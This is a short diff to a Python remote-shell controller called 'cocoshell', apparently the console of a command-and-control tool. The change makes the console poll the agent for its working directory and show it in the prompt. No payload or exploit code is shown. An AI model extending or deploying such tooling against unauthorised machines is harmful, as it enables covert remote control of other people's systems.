@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-import subprocess, time, sqlite3, argparse, os, sys, random, string
+import subprocess, time, sqlite3, argparse, os, sys, random, string, requests
 from os.path import exists
 from core.payload import generate
 from core.log import Log
@@ -50,7 +50,8 @@ logger.payload(generate(agent_url, frequency))
 
 waiting_for_result = False
 result = None
-prompt = "cocoshell> "
+prompt = "cocoshell"
+pwd = ''
 
 #############################################################################
 
@@ -75,7 +76,14 @@ def not_implemented():
 
 try:
     while (True):
-        command = input(prompt).strip()
+        response = requests.get(agent_url + '/pwd')
+        pwd = response.text
+
+        if pwd == "NULL":
+            time.sleep(1.0)
+            continue
+
+        command = input(f"*{prompt}* {pwd}> ").strip()
         if command == "exit":
             raise SystemExit
         if command == "":
@@ -121,10 +129,10 @@ except SystemExit:
     logger.debug("Exiting")
     pass
 finally:
-    
     logger.debug("Cocoshell stopping")
     logger.debug("Cleaning up")
     cur.execute("UPDATE commands SET hasBeenRun = 1")
+    cur.execute("UPDATE pwd SET pwd = 'NULL'")
     con.commit()
     proc.terminate()
     con.close()
